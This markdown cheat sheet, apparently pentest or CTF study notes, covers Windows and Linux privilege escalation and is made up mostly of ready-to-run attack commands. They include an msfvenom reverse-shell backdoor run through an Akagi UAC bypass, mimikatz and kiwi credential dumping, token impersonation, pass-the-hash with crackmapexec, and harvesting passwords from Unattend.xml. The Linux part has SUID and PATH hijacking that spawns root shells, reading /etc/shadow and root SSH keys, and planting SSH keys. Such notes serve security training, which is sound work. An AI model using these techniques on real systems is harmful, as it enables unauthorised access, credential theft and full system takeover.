# $\color{#009466}\textbf{Windows}$


Note: if you have a valid user credential you can authenticate in windows target from SMB, RDP, WinRM
<br>

<details>
<summary>$\huge{\text{Automation script}}$</summary>

- https://github.com/itm4n/PrivescCheck : useful for gather information
- `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"` : run from command prompt

<br><br>  
</details>

<details>
<summary>$\huge{\text{UAC Bypass}}$</summary>
 
- User Account Control (UAC) is a feature that enables a consent prompt for elevated activities.
- Prerequisites:
  1.  User must be a member of the Administrators group.
     - `net localgroup administrators`
  2. Full interactive shell with the victim (a common nc.exe shell is not enough).
     - You can use meterpreter
- Metasploit
  - search module bypassuac ...
- UACME
  1. If architecture is x64 it's better to use meterpreter x64 or migrate to process x64 with sessions=1
     - `ps` to show process 
     - (ex. `migrate <PID explorer.exe>`)
  3. Upload Akagi (Akagi64.exe if x64)
  3. Create payload with msfvenom
     - `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o backdoor.exe`
  5. Use exploit/multi/handler to start a listener
  6. Akagi64.exe 23 <payload_full_path>
     - **NOTE FULL PATH**
  7. Once run, we will get meterpreter session - getprivs/getsystem to get elevated privs

<br><br>
</details>

<details>
<summary>$\huge{\text{Impersonate Tokens}}$</summary>
  
- With msfconsole: `load incognito`
- `list_tokens -u`
- `impersonate_token <token_name>`
- You may need to migrate process to a <user> process
  - Ex. `getpid` : 2628, `ps` :
    |PID  | PPID | Name | Arch | Session | User | Path|
    | ---  | --- | --- | ---  | --- | --- | --- |
    |2628 | 4780 | WHAYQtsbkO.exe |  | 1 | | |
    |... | ... | ... | ... | ... | ... | ... |
    |2948 | 2036 | explorer.exe | X64 | 1 | ATTACKDEFENSE\Administrator | C:\Windows\explorer.exe |
- `getpid 2948`
- Of course you can repeat the process to become NT AUTHORITY\SYSTEM

<br><br>
</details>

<details>
<summary>$\huge{\text{Password in configuration file (Unattend.xml)}}$</summary>

- An answer file is an XML-based file that contains setting definitions and values to use during Windows Setup. Answer files (or Unattend files) are used by Administrators when they are setting up fresh images as it allows for an automated setup for Windows systems.
- ```
  C:\unattend.xml
  C:\Windows\Panther\Unattend.xml
  C:\Windows\Panther\Unattend\Unattend.xml
  C:\Windows\system32\sysprep.xml
  C:\Windows\system32\sysprep\sysprep.xml
  ```
- Extract password and decode it (from base64)

<br><br>     
</details>

<details>
<summary>$\huge{\text{Credential Dumping (Mimikatz - Kiwi - Hashdump)}}$</summary>
    
- Prerequisites: User must be a member a local Administrators.
1) Method (Metasploit - Meterpreter)
   - You may need to migrate meterpreter to NT AUTHORITY\SYSTEM process (ex. `migrate <PID explorer.exe>`)
   - `hashdump`
2) Kiwi (Metasploit - Meterpreter)
   - You may need to migrate meterpreter to NT AUTHORITY\SYSTEM process (ex. `migrate <PID explorer.exe>`)
   - `load kiwi`
   - `creds_all` Retrieve all credentials (parsed)
   - `lsa_dump_sam` Here you can see that NTLM hashes for all of the user accounts on the system.
   - To find the clear text passwords : `lsa_dump_secrets`
     - However, from the Windows version 8.0+, windows don’t store any plain text password. So, it can be helpful for the older version of the Windows.
3) Mimikatz
   - upload mimikatz.exe
   - `\mimkatz.exe`
   - `privilege::debug` - should return Privilege '20' OK - This should be a standard for running mimikatz as it needs local administrator access
   - `lsadump::sam` : NTLM hashes for all of the user accounts on the system 
   - `sekurlsa::logonpasswords` : To find the clear text passwords, but it's not always possible

<br><br>
</details>

<details>
<summary>$\huge{\text{Pass the Hash}}$</summary>

Useful for persinstence...
1) `crackmapexec smb <ip> -u <administrator> -H <NTLM hash> -x "ipconfig"`
2) Metasploit : windows/smb/psexec and set SMBPass with `<LM hash>:<NTLM hash>`
   - empty LM hash : `AAD3B435B51404EEAAD3B435B51404EE` (means its non-use).
     - `AAD3B435B51404EEAAD3B435B51404EE:<NTLM>`
   - With `hashdump` you have the right format

<br><br>
</details>

<details>
<summary>$\huge{\text{Other}}$</summary>

- Powershell History
- Saved Windows Credentials
  - cmdkey /list
  - runas /savecred /user:admin cmd.exe
- Scheduled Tasks
- Insecure Permissions on Service Executable
- Unquoted Service Paths
- Insecure Service Permissions
- Windows Privileges
- Unpatched Software

<br><br>
</details>


# $\color{#009466}\textbf{Linux}$

<details>
<summary>$\huge{\text{Vulnerable program}}$</summary>

- Search scripts that execute programs or programs. : Search for any vulnerable version. One example: chkrootkit v0.49 (running as root)
  - `ps aux`

<br><br>
</details>

<details>
<summary>$\huge{\text{Weak Permissions}}$</summary>
  
- `find / -not -type l -perm -o+w ` : world-writable files
  - Example: maybe you can edit shadow file...

<br><br>
</details>

<details>
<summary>$\huge{\text{Sudo}}$</summary>
  
- `sudo -l`
  - search on gtfobins how to exploit

<br><br>
</details>

<details>
<summary>$\huge{\text{SUID - custom binary}}$</summary>
  
- Premise: you have `binary_name` (with suid) that use/load/execute `loaded_binary`
- Extract strings from the binary – look for shared libraries or binaries being loaded / executed at runtime
  - `strings binary_name`
1. Method
   - `cp /bin/bash /path/to/loaded_binary`
2. Method
- Delete the loaded binary and replace with a new one:
- ```
  #include <stdio.h>
  #include <stdlib.h>
  
  int main() {
      system("/bin/bash -i"); 
      return 0;
  }
  ```
- `gcc binary.c -o <loaded_binary>` : compile
- `./binary_name` : run the binary


<br><br>
</details>

<details>
<summary>$\huge{\text{Other}}$</summary>

- `sudo -l`
  - setenv?
- SUID/GUID
- Look for capabilities
- History Files
- Docker group
- Cron jobs
- SSH Keys
- PATH
- NFS
- Writable /etc/shadow
- Writable /etc/passwd
- Are there scripts that use commands?
  - If the command is executed without full path you can modify PATH variable
  - ` strings <program_name> `
  - you see ` tail -f /var/log/nginx/access.log `
  - ```
    #!/bin/bash
    /bin/bash -p
    ```
  - ` chmod +x /tmp/tail `
  - ` export PATH=/tmp:$PATH `
  - ` ./<program_name> `
- Is there a database? Can I access to it?
  - Look at config file or source code of webpages connecting to db
- Look at the source code of the php,py,jsp ... files of the website
  - Especially login files. Any password?
- Writable authorized_key folder?
  - generate new ssh keys
- Can I read some file with sudo?
  - /root/root.txt, /etc/shadow, /root/.ssh/id_rsa
- Can I write a file in the root user directory?
  - generate ssh key with ssh-keygen and save it in the root user dir
- Kernel Exploits
- Linpeas.sh
- [GTFObins](https://gtfobins.github.io)

<br><br>
</details>

# Resource
- **juggernaut-sec.com/blog/** Windows/Linux privesc and active directory hacking
- **gtfobins.github.io** *GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems*
- **github.com/carlospolop/PEASS-ng/tree/master/linPEAS** *Linux Privilege Escalation Awesome Script*
- **github.com/DominicBreuker/pspy** *Monitor linux processes without root permissions*
- **github.com/gtworek/Priv2Admin** *Windows Privileges with Windows OS privileges*
